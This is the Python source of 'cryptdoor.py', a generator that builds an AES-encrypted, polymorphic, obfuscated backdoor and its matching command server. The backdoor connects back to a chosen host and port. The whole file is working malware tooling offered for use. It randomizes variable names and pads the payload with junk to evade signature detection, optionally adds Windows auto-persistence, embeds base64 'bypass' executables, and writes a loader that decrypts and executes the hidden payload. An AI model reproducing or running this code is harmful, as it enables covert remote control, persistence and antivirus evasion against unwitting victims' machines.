#!/usr/bin/env python
#
# cryptdoor.py - AES encrypted polymorphic obfuscated backdoor
# by @d4rkcat github.com/d4rkcat
#
## This program is free software: you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation, either version 3 of the License, or
## (at your option) any later version.
#
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
## GNU General Public License at (http://www.gnu.org/licenses/) for
## more details.

from Crypto.Cipher import AES
import base64, random, string, sys, os, argparse, subprocess

def randKey(bytes):
	return ''.join(random.choice(string.ascii_letters + string.digits + "{}!@#$^&()*&[]|,./?") for x in range(bytes))

def randVar():
	if random.choice('IO') == 'I':
		return random.choice('lIi') + ''.join(random.choice('lIi1') for x in range(random.randint(15,20)))
	else:
		return random.choice('oO') + ''.join(random.choice('oO0') for x in range(random.randint(15,20)))

def frot(string):
	a = string.encode('rot13').encode('base64').replace('=', '').replace('\n', '')
	return base64.b64encode(fxor(a)).replace('=', '').replace('\n', '')

def fxor(s1):
	return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(s1,xorkey))

parser = argparse.ArgumentParser(prog='cryptdoor', usage='./cryptdoor.py [options]')
parser.add_argument('-i', "--hostname", type=str, help='Ip or hostname to connect back to.')
parser.add_argument("-p", "--port", type=str, help="Port.")
parser.add_argument('-o', "--obfuscate", action="store_true", help='Enable Obfuscation of backdoor source code.')
parser.add_argument('-a', "--persistence", action="store_true", help='Enable Auto-persistence.')
parser.add_argument('-x', "--proxy", action="store_true", help='Enable HTTP proxy connect.')
parser.add_argument('-b', "--backdoorname", type=str, help='Name of backdoor (default backdoor.py).')
parser.add_argument('-s', "--servername", type=str, help='Name of server (default server.py).')
args = parser.parse_args()

if len(sys.argv) == 1:
	parser.print_help()
	exit()

if args.hostname and args.port:
	hostname = args.hostname
	portnumber = args.port
else:
	parser.print_help()
	exit()

if args.backdoorname:
	backdoorName = args.backdoorname
else:
	backdoorName = "backdoor.py"

if args.servername:
	serverName = args.servername
else:
	serverName = "server.py"

if args.proxy:
	proxysetting = 'useproxy = True'
else:
	proxysetting = 'useproxy = False'

xorkey = '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'
BLOCK_SIZE, PADDING = 32, '{'
pad = lambda s: str(s) + (BLOCK_SIZE - len(str(s)) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
key, iv, secretkey = randKey(32), randKey(16), randKey(32)
be64var, bd64var, AESvar, envvar = randVar(), randVar(), randVar(), randVar()
triplequote = "'" * 3
lswinservices = triplequote + '''for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a''' + triplequote
junkvar = randVar()
junk = junkvar + ' = "' + ''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(10,25000))) + '"'  # Add a random amount of random shit to make sure the size is always different.
junk2 = randVar() + ' = "' + ''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(10,25000))) + '"'

if args.obfuscate:
	xoroffset = random.randint(500,10000)
	junk = junkvar + ' = "' + ''.join(random.choice(string.ascii_letters + string.digits) for x in range(xoroffset)) + xorkey + ''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(500,5000))) + '"'

if args.persistence:
	persistpart = '''
	else:
		if isAdmin and platform.uname()[2] == '7':
			fpersist()
'''
	print ' [*] Auto-persistence enabled.'
else:
	persistpart = ' '

with open('base64/86', 'rb') as exe86:
	bypass86 = "bypass86exe = '%s'" % (exe86.read())

with open('base64/64', 'rb') as exe64:
	bypass64 = "bypass64exe = '%s'" % (exe64.read())

if args.obfuscate:
	with open('stubs/backdoor_obfs.py', 'rb') as finalbackdoor:
		readyscript = finalbackdoor.read().replace('**n', '\\n').replace('***HOST***', "funrot('" + frot(hostname) + "')").replace('***PORT***', "funrot('" + frot(portnumber) + "')").replace('***SECRET***', "funrot('" + frot(secretkey) + "')").replace('**r', '\\r').replace('***PERSIST***', persistpart).replace('***AES***', AESvar).replace('***B64D***',bd64var).replace('***ENV***', envvar).replace('***B64E***',be64var).replace('***PROXY***', proxysetting).replace('***JUNK***', junk).replace('***64EXE***', bypass64).replace('***86EXE***', bypass86).replace('***JUNK2***', junk2).replace('***XOR***', '%s[%s:%s]' % (junkvar, xoroffset, xoroffset + 1000))
	with open('tempobfs.py', 'wb') as o:
		o.write(readyscript)
	obstime = subprocess.Popen('python pyobfuscate.py -s %s tempobfs.py' % (''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(25,80)))), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	readyscript = obstime.stdout.read()
	os.remove('tempobfs.py')
	myendings = ['from Crypto import Random', 'from Crypto.Cipher import AES as %s' % (AESvar), 'from base64 import b64decode as %s' % (bd64var), 'from base64 import b64encode as %s' % (be64var), 'from os import getenv as %s' % (envvar)]
else:
	with open('stubs/backdoor.py', 'rb') as finalbackdoor:
		readyscript = finalbackdoor.read().replace('**n', '\\n').replace('***HOST***', hostname).replace('***PORT***', portnumber).replace('***SECRET***', secretkey).replace('**r', '\\r').replace('***PERSIST***', persistpart).replace('***AES***', AESvar).replace('***B64D***',bd64var).replace('***B64E***',be64var).replace('***PROXY***', proxysetting).replace('***WINSERVICES***', lswinservices).replace('***JUNK***', junk).replace('***64EXE***', bypass64).replace('***86EXE***', bypass86).replace('***JUNK2***', junk2)
	myendings = ['from Crypto import Random', 'from Crypto.Cipher import AES as %s' % (AESvar), 'from base64 import b64decode as %s' % (bd64var), 'from base64 import b64encode as %s' % (be64var)]

cipher = AES.new(key)
encrypted = EncodeAES(cipher, readyscript)

myimports = ['subprocess', 'platform', 'socket', 'os', 'struct', 'urllib2', 'binascii', 'ctypes', 'threading', 'string', 'sqlite3', 'requests', 'sys']
mywindows = ['win32crypt', 'pyHook', 'pythoncom', 'win32api', 'win32gui', 'win32ui', 'win32con']

if args.proxy:
	mywindows.append('socks')

random.shuffle(myimports)
random.shuffle(myendings)
random.shuffle(mywindows)

with open(backdoorName, 'w') as f:
	f.write('#!/usr/bin/env python\nimport ')
	f.write(",".join(myimports) + "\n")
	f.write(";".join(myendings) + "\n")
	f.write('try:\n	import ')
	f.write(",".join(mywindows) + "\n")
	f.write('except:\n	pass\n')
	f.write("exec(%s(\"%s\"))" % (bd64var,base64.b64encode("exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" %(AESvar,key,bd64var,encrypted))))

with open('stubs/server.py', 'rb') as rawserv:
	finalserver = rawserv.read().replace('**n', '\\n').replace('**r', '\\r').replace('***SECRET***', secretkey).replace('***PORT***', portnumber)

with open(serverName, 'wb') as se:
	se.write(finalserver)

if os.name == 'posix':
	os.system('chmod +x %s %s' % (backdoorName, serverName))
print " [*] Backdoor written to %s\n [*] Server written to %s" % (backdoorName, serverName)
